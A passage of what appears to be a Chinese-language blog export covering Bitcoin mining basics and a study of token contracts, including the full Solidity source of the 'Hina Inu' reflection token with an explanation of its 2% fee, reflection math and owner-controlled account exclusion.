软件配合使用的图形用户界面。相对会更加友好。\nMulitMiner这是另一个可视化界面，但这次是针对 BFGMiner。这个界面的布局非常直观，它非常适合比特币挖矿新手，因为它有一个易操作的控制面板。\n挖矿难度挖矿难度每 2,016 个区块或大约每两周更改一次。随后的难度级别取决于矿工在前一个周期中的效率。挖矿难度还受到加入比特币网络的新矿工数量的影响，因为它增加了哈希率或部署用于挖掘加密货币的计算能力。挖出区块的速度并不是固定的，而是随着挖矿难度的变化在10分钟上下浮动， 挖矿难度越大，出块时间就越长。2013 年和 2014 年，随着比特币价格上涨，更多矿工加入其网络，发现一个交易区块的平均时间从 10 分钟下降到 9 分钟。\n2020年8月挖矿难度超过16万亿。也就是说，计算机产生低于目标的哈希值的机会是 16 万亿分之一。diffculty &#x3D; difficulty_1_target &#x2F; target此处的 difficulty_1_target 为一个常数，非常大的一个数字（ 2^(256-32)−1 ）。表示挖矿的初始难度，目标值越小，区块生成难度越大。\n比特币系统中区块的生产速度是根据之前产生区块的速度调整，之前出块速度大于10分钟，则认为需要降低难度，则需要提高第一个公式中target的值，而target则通过如下公式计算：target &#x3D; current_target * ( actual time &#x2F; excepted time )\n比特币挖矿的三个主要成本\n电力：根据很多数据给出的一些估计，电力成本将会占比特币挖矿成本的 90%。\n挖矿系统：台式电脑和常规游戏系统不适合或不适合比特币挖矿，该过程可能会使此类系统升温并导致出现带宽问题。\n\n专用集成芯片（ASIC）系统：是比特币挖矿的定制机器，是比特币矿工的主要基础设施投资。此类机器的价格范围从 4,000 美元到 12,000 美元不等。即使成本如此之高，单个配备 ASIC 的系统生成的比特币也少于单个比特币。比特币矿工将数千个 ASIC 系统组织成 24⁄7 运行的矿池，以生成解决哈希难题所需的 64 位十六进制数。\n\n网络基础设施：网络速度对比特币挖掘过程没有显着影响。但是，拥有 24⁄7 不间断的 Internet 连接非常重要。该连接还应该有来自附近矿池的延迟。专用网络减少了外部依赖并确保将延迟降至最低。离线并不一定会停止同步交易的过程。但它会使该过程耗时，并且可能在连接恢复后容易出错。\n\n挖矿历史既然提到挖矿，挖矿也有自己的历史演变，在硬件上尤为突出，实际的比特币挖矿过程是通过比特币挖矿硬件完成的。CUP挖矿2009年1月3日，中本聪在芬兰赫尔辛基的一个小型服务器上使用CPU挖出了比特币的第一个区块——创世区块（Genesis Block），并获得了50个比特币的奖励。但是随着对挖矿算法的深入研究，挖矿都是在重复一样的工作，而CPU作为通用性计算单元，所以选用GPU挖矿更为合适。\nGPU挖矿2010年，GPU挖矿产生，GPU可以轻易的进行数百个线程的整数计算并发，一个GPU显卡相当于几十个CPU，算力得到了明显提升。\nASIC挖矿ASIC（Application-Specific Integrated Circuit）指的是专门设计来完成特定计算任务的集成电路，ASIC矿机相当于专门为数字货币挖矿定制的集成电路设备。\n挖矿挖矿中有个定义是算力，一般以每秒进行多少次 hash 计算为单位，记为 h&#x2F;s。比特币网络每10分钟生成一个区块，记录当前10分钟网络中所有交易的账本记录，\n比特币系统出一道数学题，比特币使用SHA256计算hash，矿工使用挖矿机进行hash函数随机碰撞。比特币钱包中的交易数据会不断上传，并把数据放到缓存池中，缓存池中有各种未打包的交易事务数据，并且缓存池对各个挖矿程序是可见的。总的来说就是用哈希值碰撞哈希值Hash（Block Header）&lt;&#x3D; target比特币采用的哈希算法是 SHA-256 ，也就是说最后会产生256位的输出，一共2^256种可能的取值。这张图清晰易懂：\n\n\n\n\n\n\n\n\n\n\nSabrina Jiang © Investopedia 2021\n一个符合要求的Block Hash由N个前导零构成，零的个数取决于网络的难度值。矿工通过尽可能快地随机生成尽可能多的“随机数”来进行这些猜测。\n再了解一个名词，nonce（number only used once）是生成 64 位十六进制数字的关键，在比特币挖矿中，nonce 的大小为 32 位。第一个随机数生成小于或等于目标哈希的哈希的矿工将获得该区块。查看Blockchain.info网站可以看到：\n\n\n\n\n\n\n\n\n\n\nInvestopedia也给出了一个可以用于估算成本和收益的网站： https://www.cryptocompare.com/mining/calculator/btc?HashingPower=15&amp;HashingUnit=TH%2Fs&amp;PowerConsumption=0&amp;CostPerkWh=0&amp;MiningPoolFee=1\n\n交易挖矿除挖矿之外，还存在交易挖矿，用户在该交易对当日总下单笔数小于等于 50 并且用户完成KYC（提交个人信息并且通过平台审核），则该用户的当日交易挖矿基数为：当日该用户在该交易对的总交易量\n","slug":"bitcoin mining","date":"2022-08-01T11:08:14.973Z","categories_index":"","tags_index":"区块链","author_index":"bcYng"},{"id":"f79410ff40b06d8b4967a5cc63af85a3","title":"Learn of three token","content":"了解了一下inu系列token以及Fee on Transfer Token\n三种token的学习1.ERC-20 Token比较容易理解，看看代码即可，不再赘述\n2.INU TokenCodepragma solidity ^0.6.12;\nabstract contract Context &#123;\n    function _msgSender() internal view virtual returns (address payable) &#123;\n        return msg.sender;\n    &#125;\n    function _msgData() internal view virtual returns (bytes memory) &#123;\n        this;\n        return msg.data;\n    &#125;\n&#125;\ninterface IERC20 &#123;\n    /**\n     * @dev Returns the amount of tokens in existence.\n     */\n    function totalSupply() external view returns (uint256);\n\n    /**\n     * @dev Returns the amount of tokens owned by `account`.\n     */\n    function balanceOf(address account) external view returns (uint256);\n\n    /**\n     * @dev Moves `amount` tokens from the caller's account to `recipient`.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a &#123;Transfer&#125; event.\n     */\n    function transfer(address recipient, uint256 amount) external returns (bool);\n\n    /**\n     * @dev Returns the remaining number of tokens that `spender` will be\n     * allowed to spend on behalf of `owner` through &#123;transferFrom&#125;. This is\n     * zero by default.\n     *\n     * This value changes when &#123;approve&#125; or &#123;transferFrom&#125; are called.\n     */\n    function allowance(address owner, address spender) external view returns (uint256);\n\n    /**\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\n     * that someone may use both the old and the new allowance by unfortunate\n     * transaction ordering. One possible solution to mitigate this race\n     * condition is to first reduce the spender's allowance to 0 and set the\n     * desired value afterwards:\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n     *\n     * Emits an &#123;Approval&#125; event.\n     */\n    function approve(address spender, uint256 amount) external returns (bool);\n\n    /**\n     * @dev Moves `amount` tokens from `sender` to `recipient` using the\n     * allowance mechanism. `amount` is then deducted from the caller's\n     * allowance.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a &#123;Transfer&#125; event.\n     */\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n\n    /**\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\n     * another (`to`).\n     *\n     * Note that `value` may be zero.\n     */\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    /**\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n     * a call to &#123;approve&#125;. `value` is the new allowance.\n     */\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n&#125;\nlibrary SafeMath &#123;\n    /**\n     * @dev Returns the addition of two unsigned integers, reverting on\n     * overflow.\n     *\n     * Counterpart to Solidity's `+` operator.\n     *\n     * Requirements:\n     *\n     * - Addition cannot overflow.\n     */\n    function add(uint256 a, uint256 b) internal pure returns (uint256) &#123;\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    &#125;\n\n    /**\n     * @dev Returns the subtraction of two unsigned integers, reverting on\n     * overflow (when the result is negative).\n     *\n     * Counterpart to Solidity's `-` operator.\n     *\n     * Requirements:\n     *\n     * - Subtraction cannot overflow.\n     */\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) &#123;\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    &#125;\n\n    /**\n     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on\n     * overflow (when the result is negative).\n     *\n     * Counterpart to Solidity's `-` operator.\n     *\n     * Requirements:\n     *\n     * - Subtraction cannot overflow.\n     */\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) &#123;\n        require(b &lt;= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    &#125;\n\n    /**\n     * @dev Returns the multiplication of two unsigned integers, reverting on\n     * overflow.\n     *\n     * Counterpart to Solidity's `*` operator.\n     *\n     * Requirements:\n     *\n     * - Multiplication cannot overflow.\n     */\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) &#123;\n        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the\n        // benefit is lost if 'b' is also tested.\n        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522\n        if (a == 0) &#123;\n            return 0;\n        &#125;\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    &#125;\n\n    /**\n     * @dev Returns the integer division of two unsigned integers. Reverts on\n     * division by zero. The result is rounded towards zero.\n     *\n     * Counterpart to Solidity's `/` operator. Note: this function uses a\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\n     * uses an invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     *\n     * - The divisor cannot be zero.\n     */\n    function div(uint256 a, uint256 b) internal pure returns (uint256) &#123;\n        return div(a, b, \"SafeMath: division by zero\");\n    &#125;\n\n    /**\n     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on\n     * division by zero. The result is rounded towards zero.\n     *\n     * Counterpart to Solidity's `/` operator. Note: this function uses a\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\n     * uses an invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     *\n     * - The divisor cannot be zero.\n     */\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) &#123;\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n        // assert(a == b * c + a % b); // There is no case in which this doesn't hold\n\n        return c;\n    &#125;\n\n    /**\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n     * Reverts when dividing by zero.\n     *\n     * Counterpart to Solidity's `%` operator. This function uses a `revert`\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\n     * invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     *\n     * - The divisor cannot be zero.\n     */\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) &#123;\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    &#125;\n\n    /**\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n     * Reverts with custom message when dividing by zero.\n     *\n     * Counterpart to Solidity's `%` operator. This function uses a `revert`\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\n     * invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     *\n     * - The divisor cannot be zero.\n     */\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) &#123;\n        require(b != 0, errorMessage);\n        return a % b;\n    &#125;\n&#125;\n\nlibrary Address &#123;\n    function isContract(address account) internal view returns (bool) &#123;\n        bytes32 codehash;\n        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;\n        assembly &#123; codehash := extcodehash(account) &#125;\n        return (codehash != accountHash &amp;&amp; codehash != 0x0);\n    &#125;\n    function sendValue(address payable recipient, uint256 amount) internal &#123;\n        require(address(this).balance >= amount, \"Address: insufficient balance\");\n        (bool success, ) = recipient.call&#123; value: amount &#125;(\"\");\n        require(success, \"Address: unable to send value, recipient may have reverted\");\n    &#125;\n    function functionCall(address target, bytes memory data) internal returns (bytes memory) &#123;\n      return functionCall(target, data, \"Address: low-level call failed\");\n    &#125;\n    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) &#123;\n        return _functionCallWithValue(target, data, 0, errorMessage);\n    &#125;\n    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) &#123;\n        return functionCallWithValue(target, data, value, \"Address: low-level call with value failed\");\n    &#125;\n\n    /**\n     * @dev Same as &#123;xref-Address-functionCallWithValue-address-bytes-uint256-&#125;[`functionCallWithValue`], but\n     * with `errorMessage` as a fallback revert reason when `target` reverts.\n     *\n     * _Available since v3.1._\n     */\n    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) &#123;\n        require(address(this).balance >= value, \"Address: insufficient balance for call\");\n        return _functionCallWithValue(target, data, value, errorMessage);\n    &#125;\n\n    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) &#123;\n        require(isContract(target), \"Address: call to non-contract\");\n\n        // solhint-disable-next-line avoid-low-level-calls\n        (bool success, bytes memory returndata) = target.call&#123; value: weiValue &#125;(data);\n        if (success) &#123;\n            return returndata;\n        &#125; else &#123;\n            // Look for revert reason and bubble it up if present\n            if (returndata.length > 0) &#123;\n                // The easiest way to bubble the revert reason is using memory via assembly\n\n                // solhint-disable-next-line no-inline-assembly\n                assembly &#123;\n                    let returndata_size := mload(returndata)\n                    revert(add(32, returndata), returndata_size)\n                &#125;\n            &#125; else &#123;\n                revert(errorMessage);\n            &#125;\n        &#125;\n    &#125;\n&#125;\n\ncontract Ownable is Context &#123;\n    address private _owner;\n\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n\n    /**\n     * @dev Initializes the contract setting the deployer as the initial owner.\n     */\n    constructor () internal &#123;\n        address msgSender = _msgSender();\n        _owner = msgSender;\n        emit OwnershipTransferred(address(0), msgSender);\n    &#125;\n\n    /**\n     * @dev Returns the address of the current owner.\n     */\n    function owner() public view returns (address) &#123;\n        return _owner;\n    &#125;\n\n    /**\n     * @dev Throws if called by any account other than the owner.\n     */\n    modifier onlyOwner() &#123;\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\n        _;\n    &#125;\n\n    /**\n     * @dev Leaves the contract without owner. It will not be possible to call\n     * `onlyOwner` functions anymore. Can only be called by the current owner.\n     *\n     * NOTE: Renouncing ownership will leave the contract without an owner,\n     * thereby removing any functionality that is only available to the owner.\n     */\n    function renounceOwnership() public virtual onlyOwner &#123;\n        emit OwnershipTransferred(_owner, address(0));\n        _owner = address(0);\n    &#125;\n\n    /**\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\n     * Can only be called by the current owner.\n     */\n    function transferOwnership(address newOwner) public virtual onlyOwner &#123;\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\n        emit OwnershipTransferred(_owner, newOwner);\n        _owner = newOwner;\n    &#125;\n&#125;\n\n\n\ncontract HinaInu is Context, IERC20, Ownable &#123;\n    using SafeMath for uint256;\n    using Address for address;\n\n    mapping (address => uint256) private _rOwned;\n    mapping (address => uint256) private _tOwned;\n    mapping (address => mapping (address => uint256)) private _allowances;\n\n    mapping (address => bool) private _isExcluded;\n    address[] private _excluded;\n   \n    uint256 private constant MAX = ~uint256(0);\n    uint256 private constant _tTotal = 100000000000 * 10**6 * 10**9;\n    uint256 private _rTotal = (MAX - (MAX % _tTotal));\n    uint256 private _tFeeTotal;\n\n    string private _name = 'Hina Inu';\n    string private _symbol = 'HINA';\n    uint8 private _decimals = 9;\n    \n    uint256 public _maxTxAmount = 100000000 * 10**6 * 10**9;\n\n    constructor () public &#123;\n        _rOwned[_msgSender()] = _rTotal;\n        emit Transfer(address(0), _msgSender(), _tTotal);\n    &#125;\n\n    function name() public view returns (string memory) &#123;\n        return _name;\n    &#125;\n\n    function symbol() public view returns (string memory) &#123;\n        return _symbol;\n    &#125;\n\n    function decimals() public view returns (uint8) &#123;\n        return _decimals;\n    &#125;\n\n    function totalSupply() public view override returns (uint256) &#123;\n        return _tTotal;\n    &#125;\n\n    function balanceOf(address account) public view override returns (uint256) &#123;\n        if (_isExcluded[account]) return _tOwned[account];\n        return tokenFromReflection(_rOwned[account]);\n    &#125;\n\n    function transfer(address recipient, uint256 amount) public override returns (bool) &#123;\n        _transfer(_msgSender(), recipient, amount);\n        return true;\n    &#125;\n\n    function allowance(address owner, address spender) public view override returns (uint256) &#123;\n        return _allowances[owner][spender];\n    &#125;\n\n    function approve(address spender, uint256 amount) public override returns (bool) &#123;\n        _approve(_msgSender(), spender, amount);\n        return true;\n    &#125;\n\n    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) &#123;\n        _transfer(sender, recipient, amount);\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\n        return true;\n    &#125;\n\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) &#123;\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));\n        return true;\n    &#125;\n\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) &#123;\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, \"ERC20: decreased allowance below zero\"));\n        return true;\n    &#125;\n\n    function isExcluded(address account) public view returns (bool) &#123;\n        return _isExcluded[account];\n    &#125;\n\n    function totalFees() public view returns (uint256) &#123;\n        return _tFeeTotal;\n    &#125;\n    \n    \n    function setMaxTxPercent(uint256 maxTxPercent) external onlyOwner() &#123;\n        _maxTxAmount = _tTotal.mul(maxTxPercent).div(\n            10**2\n        );\n    &#125;\n\n    function reflect(uint256 tAmount) public &#123;\n        address sender = _msgSender();\n        require(!_isExcluded[sender], \"Excluded addresses cannot call this function\");\n        (uint256 rAmount,,,,) = _getValues(tAmount);\n        _rOwned[sender] = _rOwned[sender].sub(rAmount);\n        _rTotal = _rTotal.sub(rAmount);\n        _tFeeTotal = _tFeeTotal.add(tAmount);\n    &#125;\n\n    function reflectionFromToken(uint256 tAmount, bool deductTransferFee) public view returns(uint256) &#123;\n        require(tAmount &lt;= _tTotal, \"Amount must be less than supply\");\n        if (!deductTransferFee) &#123;\n            (uint256 rAmount,,,,) = _getValues(tAmount);\n            return rAmount;\n        &#125; else &#123;\n            (,uint256 rTransferAmount,,,) = _getValues(tAmount);\n            return rTransferAmount;\n        &#125;\n    &#125;\n\n    function tokenFromReflection(uint256 rAmount) public view returns(uint256) &#123;\n        require(rAmount &lt;= _rTotal, \"Amount must be less than total reflections\");\n        uint256 currentRate =  _getRate();\n        return rAmount.div(currentRate);\n    &#125;\n\n    function excludeAccount(address account) external onlyOwner() &#123;\n        require(!_isExcluded[account], \"Account is already excluded\");\n        if(_rOwned[account] > 0) &#123;\n            _tOwned[account] = tokenFromReflection(_rOwned[account]);\n        &#125;\n        _isExcluded[account] = true;\n        _excluded.push(account);\n    &#125;\n\n    function includeAccount(address account) external onlyOwner() &#123;\n        require(_isExcluded[account], \"Account is already excluded\");\n        for (uint256 i = 0; i &lt; _excluded.length; i++) &#123;\n            if (_excluded[i] == account) &#123;\n                _excluded[i] = _excluded[_excluded.length - 1];\n                _tOwned[account] = 0;\n                _isExcluded[account] = false;\n                _excluded.pop();\n                break;\n            &#125;\n        &#125;\n    &#125;\n\n    function _approve(address owner, address spender, uint256 amount) private &#123;\n        require(owner != address(0), \"ERC20: approve from the zero address\");\n        require(spender != address(0), \"ERC20: approve to the zero address\");\n\n        _allowances[owner][spender] = amount;\n        emit Approval(owner, spender, amount);\n    &#125;\n\n    function _transfer(address sender, address recipient, uint256 amount) private &#123;\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\n        require(amount > 0, \"Transfer amount must be greater than zero\");\n        if(sender != owner() &amp;&amp; recipient != owner())\n          require(amount &lt;= _maxTxAmount, \"Transfer amount exceeds the maxTxAmount.\");\n            \n        if (_isExcluded[sender] &amp;&amp; !_isExcluded[recipient]) &#123;\n            _transferFromExcluded(sender, recipient, amount);\n        &#125; else if (!_isExcluded[sender] &amp;&amp; _isExcluded[recipient]) &#123;\n            _transferToExcluded(sender, recipient, amount);\n        &#125; else if (!_isExcluded[sender] &amp;&amp; !_isExcluded[recipient]) &#123;\n            _transferStandard(sender, recipient, amount);\n        &#125; else if (_isExcluded[sender] &amp;&amp; _isExcluded[recipient]) &#123;\n            _transferBothExcluded(sender, recipient, amount);\n        &#125; else &#123;\n            _transferStandard(sender, recipient, amount);\n        &#125;\n    &#125;\n\n    function _transferStandard(address sender, address recipient, uint256 tAmount) private &#123;\n        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);\n        _rOwned[sender] = _rOwned[sender].sub(rAmount);\n        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);       \n        _reflectFee(rFee, tFee);\n        emit Transfer(sender, recipient, tTransferAmount);\n    &#125;\n\n    function _transferToExcluded(address sender, address recipient, uint256 tAmount) private &#123;\n        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);\n        _rOwned[sender] = _rOwned[sender].sub(rAmount);\n        _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);\n        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);           \n        _reflectFee(rFee, tFee);\n        emit Transfer(sender, recipient, tTransferAmount);\n    &#125;\n\n    function _transferFromExcluded(address sender, address recipient, uint256 tAmount) private &#123;\n        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);\n        _tOwned[sender] = _tOwned[sender].sub(tAmount);\n        _rOwned[sender] = _rOwned[sender].sub(rAmount);\n        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);   \n        _reflectFee(rFee, tFee);\n        emit Transfer(sender, recipient, tTransferAmount);\n    &#125;\n\n    function _transferBothExcluded(address sender, address recipient, uint256 tAmount) private &#123;\n        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);\n        _tOwned[sender] = _tOwned[sender].sub(tAmount);\n        _rOwned[sender] = _rOwned[sender].sub(rAmount);\n        _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);\n        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);        \n        _reflectFee(rFee, tFee);\n        emit Transfer(sender, recipient, tTransferAmount);\n    &#125;\n\n    function _reflectFee(uint256 rFee, uint256 tFee) private &#123;\n        _rTotal = _rTotal.sub(rFee);\n        _tFeeTotal = _tFeeTotal.add(tFee);\n    &#125;\n\n    function _getValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256, uint256) &#123;\n        (uint256 tTransferAmount, uint256 tFee) = _getTValues(tAmount);\n        uint256 currentRate =  _getRate();\n        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) = _getRValues(tAmount, tFee, currentRate);\n        return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee);\n    &#125;\n\n    function _getTValues(uint256 tAmount) private pure returns (uint256, uint256) &#123;\n        uint256 tFee = tAmount.div(100).mul(2);\n        uint256 tTransferAmount = tAmount.sub(tFee);\n        return (tTransferAmount, tFee);\n    &#125;\n\n    function _getRValues(uint256 tAmount, uint256 tFee, uint256 currentRate) private pure returns (uint256, uint256, uint256) &#123;\n        uint256 rAmount = tAmount.mul(currentRate);\n        uint256 rFee = tFee.mul(currentRate);\n        uint256 rTransferAmount = rAmount.sub(rFee);\n        return (rAmount, rTransferAmount, rFee);\n    &#125;\n\n    function _getRate() private view returns(uint256) &#123;\n        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();\n        return rSupply.div(tSupply);\n    &#125;\n\n    function _getCurrentSupply() private view returns(uint256, uint256) &#123;\n        uint256 rSupply = _rTotal;\n        uint256 tSupply = _tTotal;      \n        for (uint256 i = 0; i &lt; _excluded.length; i++) &#123;\n            if (_rOwned[_excluded[i]] > rSupply || _tOwned[_excluded[i]] > tSupply) return (_rTotal, _tTotal);\n            rSupply = rSupply.sub(_rOwned[_excluded[i]]);\n            tSupply = tSupply.sub(_tOwned[_excluded[i]]);\n        &#125;\n        if (rSupply &lt; _rTotal.div(_tTotal)) return (_rTotal, _tTotal);\n        return (rSupply, tSupply);\n    &#125;\n&#125;\n\nAnalyze此代币本质上也是一种基于 ERC20 协议实现的代币，其代币发行总量为 1,000,000,000,000,000 枚，是一种通缩分红币\n通缩指的是每次转账都会收取一定手续费，这些手续费会直接销毁，进而导致总量的通缩，即代币可以通过销毁来增加价值。分红指的是，用户的余额会随着其他用户转账而增加。\n用一个比喻来说就是，将一块固定蛋糕（_tTotal）分给总量会变化的盘子中（_rTotal），每次转账都会打碎一部分盘子，这样剩余盘子分到的蛋糕就变多了。\n_tTotal：总共的蛋糕\n_rTotal：总共的盘子\n_rOwned ：一个account持有的盘子数量\n_tOwned ：只用于非分红用户的转账\nfunction _transfer(address sender, address recipient, uint256 amount) private &#123;\n       require(sender !&#x3D; address(0), &quot;ERC20: transfer from the zero address&quot;);\n       require(recipient !&#x3D; address(0), &quot;ERC20: transfer to the zero address&quot;);\n       require(amount &gt; 0, &quot;Transfer amount must be greater than zero&quot;);\n       if(sender !&#x3D; owner() &amp;&amp; recipient !&#x3D; owner())\n         require(amount &lt;&#x3D; _maxTxAmount, &quot;Transfer amount exceeds the maxTxAmount.&quot;);\n           \n       if (_isExcluded[sender] &amp;&amp; !_isExcluded[recipient]) &#123;\n           _transferFromExcluded(sender, recipient, amount);\n       &#125; else if (!_isExcluded[sender] &amp;&amp; _isExcluded[recipient]) &#123;\n           _transferToExcluded(sender, recipient, amount);\n       &#125; else if (!_isExcluded[sender] &amp;&amp; !_isExcluded[recipient]) &#123;\n           _transferStandard(sender, recipient, amount);\n       &#125; else if (_isExcluded[sender] &amp;&amp; _isExcluded[recipient]) &#123;\n           _transferBothExcluded(sender, recipient, amount);\n       &#125; else &#123;\n           _transferStandard(sender, recipient, amount);\n       &#125;\n   &#125;\n\n此部分函数区分了四种转账情况：\n①黑名单转向非黑名单账户\n②非黑名单账户转向黑名单账户\n③非黑名单账户转向非黑名单账户\n④黑名单账户转向黑名单帐户\n第一行都会通过getvalue函数将转账代币数额 ( tAmount ) 转换为奖励数额 ( rAmount ) 以及 一定的手续费数量\ntamount的2%作为惩罚，tamount*2%&#x2F;currentrate作为打碎的盘子数量，即销毁数量\nfunction balanceOf(address account) public view override returns (uint256) &#123;\n     if (_isExcluded[account]) return _tOwned[account];\n     return tokenFromReflection(_rOwned[account]);      //计算towned[acount]\n &#125;\n function tokenFromReflection(uint256 rAmount) public view returns(uint256) &#123;\n     require(rAmount &lt;= _rTotal, \"Amount must be less than total reflections\");\n     uint256 currentRate =  _getRate();\n     return rAmount.div(currentRate);\n &#125;    \n function _getRate() private view returns(uint256) &#123;\n     (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();\n     return rSupply.div(tSupply);\n &#125;\n function _reflectFee(uint256 rFee, uint256 tFee) private &#123;\n     _rTotal = _rTotal.sub(rFee);\n     _tFeeTotal = _tFeeTotal.add(tFee);\n &#125;\n function _getCurrentSupply() private view returns(uint256, uint256) &#123;\n     uint256 rSupply = _rTotal;\n     uint256 tSupply = _tTotal;      \n     for (uint256 i = 0; i &lt; _excluded.length; i++) &#123;\n         if (_rOwned[_excluded[i]] > rSupply || _tOwned[_excluded[i]] > tSupply) return (_rTotal, _tTotal);\n         rSupply = rSupply.sub(_rOwned[_excluded[i]]);\n         tSupply = tSupply.sub(_tOwned[_excluded[i]]);\n     &#125;\n     if (rSupply &lt; _rTotal.div(_tTotal)) return (_rTotal, _tTotal);\n     return (rSupply, tSupply);\n &#125;\n \n\n以上函数的配合实现了通过销毁代币提高用户余额的功能，可用如下公式表示\ntOwned[account] &#x3D; rOwned[account] &#x2F; rSupply * tSupply\n其中rSupply 随交易数量增加而减少，分母变小，balance变大\n以下函数实现了黑名单的增删功能\nfunction excludeAccount(address account) external onlyOwner() &#123;\n    require(!_isExcluded[account], \"Account is already excluded\");\n    if(_rOwned[account] > 0) &#123;\n        _tOwned[account] = tokenFromReflection(_rOwned[account]);\n    &#125;\n    _isExcluded[account] = true;\n    _excluded.push(account);\n&#125;\n\nfunction includeAccount(address account) external onlyOwner() &#123;\n    require(_isExcluded[account], \"Account is already excluded\");\n    for (uint256 i = 0; i &lt; _excluded.length; i++) &#123;\n        if (_excluded[i] == account) &#123;\n            _excluded[i] = _excluded[_excluded.length - 1];\n            _tOwned[account] = 0;\n            _isExcluded[account] = false;\n            _excluded.pop();\n            break;\n        &#125;\n    &#125;\n&#125;\n\n3.Fee on Transfer TokenCodepragma solidity 0.5.16;\ncontract Ownable &#123;\n    address private _owner;\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n    constructor () internal &#123;\n        _owner = msg.sender;\n        emit OwnershipTransferred(address(0), _owner);\n    &#125;\n    function owner() public view returns (address) &#123;\n        return _owner;\n    &#125;\n    modifier onlyOwner() &#123;\n        require(isOwner(), \"Ownable: caller is not the owner\");\n        _;\n    &#125;\n    function isOwner() public view returns (bool) &#123;\n        return msg.sender == _owner;\n    &#125;\n    function renounceOwnership() public onlyOwner &#123;\n        emit OwnershipTransferred(_owner, address(0));\n        _owner = address(0);\n    &#125;\n    function transferOwnership(address newOwner) public onlyOwner &#123;\n        _transferOwnership(newOwner);\n    &#125;\n    function _transferOwnership(address newOwner) internal &#123;\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\n        emit OwnershipTransferred(_owner, newOwner);\n        _owner = newOwner;\n    &#125;\n&#125;\ninterface IERC20 &#123;\n    /**\n     * @dev Returns the amount of tokens in existence.\n     */\n    function totalSupply() external view returns (uint256);\n    /**\n     * @dev Returns the amount of tokens owned by `account`.\n     */\n    function balanceOf(address account) external view returns (uint256);\n    /**\n     * @dev Moves `amount` tokens from the caller's account to `recipient`.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a `Transfer` event.\n     */\n    function transfer(address recipient, uint256 amount) external returns (bool);\n    /**\n     * @dev Returns the 